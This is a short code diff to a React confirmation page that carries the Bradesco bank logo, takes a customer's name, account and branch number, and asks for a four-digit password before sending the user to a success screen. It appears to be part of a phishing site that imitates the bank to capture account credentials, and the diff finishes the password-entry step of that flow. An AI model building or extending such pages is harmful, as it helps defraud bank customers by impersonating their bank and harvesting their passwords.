@@ -1,9 +1,10 @@
 import { useState } from "react";
-import { useLocation } from "react-router-dom";
+import { useLocation, useNavigate } from "react-router-dom";
 import bradescoLogo from "@/assets/bradesco-logo.png";
 
 const Confirmacao = () => {
   const location = useLocation();
+  const navigate = useNavigate();
   const { nome, conta, agencia } = (location.state as any) || {};
   const [senha, setSenha] = useState("");
   const [selected, setSelected] = useState<"fatura" | "saldo">("saldo");
@@ -90,7 +91,11 @@ const Confirmacao = () => {
 
       {/* Confirm Button */}
       <div className="px-5 pb-8">
-        <button className="w-full py-4 rounded-full bg-white/80 text-[#D7004D] font-semibold text-base hover:bg-white/90 transition-opacity">
+        <button
+          onClick={() => { if (senha.length === 4) navigate("/sucesso"); }}
+          disabled={senha.length !== 4}
+          className="w-full py-4 rounded-full bg-white/80 text-[#D7004D] font-semibold text-base hover:bg-white/90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed"
+        >
           Confirmar
         </button>
       </div>
